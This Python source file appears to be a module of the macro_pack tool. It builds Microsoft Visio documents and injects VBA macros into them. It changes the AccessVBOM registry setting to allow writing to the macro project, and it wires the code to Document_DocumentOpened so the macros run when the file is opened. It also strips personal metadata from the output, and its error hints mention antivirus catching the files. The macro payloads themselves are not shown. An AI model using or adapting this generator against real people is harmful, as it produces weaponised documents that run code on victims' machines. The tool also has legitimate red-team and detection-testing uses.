
#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
import os

if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport
    import winreg # @UnresolvedImport

import logging
from modules.vba_gen import VBAGenerator
from common import utils


class VisioGenerator(VBAGenerator):
    """ Module used to generate MS Visio file from working dir content"""
    
    def getAutoOpenVbaFunction(self):
        return "Document_DocumentOpened"
    
    def getAutoOpenVbaSignature(self):
        return "Private Sub Document_DocumentOpened(ByVal doc As IVDocument)" 
    
    def enableVbom(self):
        # Enable writing in macro (VBOM)
        # First fetch the application version
        objVisio = win32com.client.Dispatch("Visio.InvisibleApp")
        self.version = objVisio.Application.Version.replace(",", ".")
        # IT is necessary to exit office or value wont be saved
        objVisio.Application.Quit()
        del objVisio
        # Next change/set AccessVBOM registry value to 1
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Visio\\Security"
        logging.info("   [-] Set %s to 1..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,1) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
    
    def disableVbom(self):
        # Disable writing in VBA project
        #  Change/set AccessVBOM registry value to 0
        keyval = "Software\\Microsoft\Office\\"  + self.version + "\\Visio\\Security"
        logging.info("   [-] Set %s to 0..." % keyval)
        Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)
        winreg.SetValueEx(Registrykey,"AccessVBOM",0,winreg.REG_DWORD,0) # "REG_DWORD"
        winreg.CloseKey(Registrykey)
        
    def check(self):
        logging.info("   [-] Check feasibility...")
        if utils.checkIfProcessRunning("visio.exe"):
            logging.error("   [!] Cannot generate Visio payload if Visio is already running.")
            if self.mpSession.forceYes or utils.yesOrNo(" Do you want macro_pack to kill Visio process? "):
                utils.forceProcessKill("visio.exe")
            else:
                return False
        # Check nb of source file
        try:
            objVisio = win32com.client.Dispatch("Visio.InvisibleApp")
            objVisio.Application.Quit()
            del objVisio
        except:
            logging.error("   [!] Cannot access Visio.InvisibleApp object. Is software installed on machine? Abort.")
            return False  
        return True
    
    def generate(self):

        logging.info(" [+] Generating MS Visio document...")
        try:
            self.enableVbom()
    
            logging.info("   [-] Open document...")
            # open up an instance of Visio with the win32com driver
            visio = win32com.client.Dispatch("Visio.InvisibleApp")
            # do the operation in background without actually opening Visio    
            document = visio.Documents.Add("")
    
            logging.info("   [-] Save document format...")        
            document.SaveAs(self.outputFilePath)
                
            self.resetVBAEntryPoint()
            logging.info("   [-] Inject VBA...")
            # Read generated files
            for vbaFile in self.getVBAFiles():
                if vbaFile == self.getMainVBAFile():       
                    with open (vbaFile, "r") as f:
                        macro=f.read()
                        visioModule = document.VBProject.VBComponents("ThisDocument")
                        visioModule.CodeModule.AddFromString(macro)
                else: # inject other vba files as modules
                    with open (vbaFile, "r") as f:
                        macro=f.read()
                        visioModule = document.VBProject.VBComponents.Add(1)
                        visioModule.Name = os.path.splitext(os.path.basename(vbaFile))[0]
                        visioModule.CodeModule.AddFromString(macro)
            
            # Remove Informations
            logging.info("   [-] Remove hidden data and personal info...")
            document.RemovePersonalInformation = True
            
            # save the document and close
            document.Save()
            document.Close()
            visio.Application.Quit()
            # garbage collection
            del visio
            self.disableVbom()
    
            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
            logging.info("   [-] Test with : \n%s --run %s\n" % (utils.getRunningApp(),self.outputFilePath))
        
        except Exception:
            logging.exception(" [!] Exception caught!")
            logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
            logging.error(" [!] Attempt to force close MS Visio applications...")
            visio = win32com.client.Dispatch("Visio.InvisibleApp")
            visio.Application.Quit()
            # If it Application.Quit() was not enough we force kill the process
            if utils.checkIfProcessRunning("visio.exe"):
                utils.forceProcessKill("visio.exe")
            del visio
            

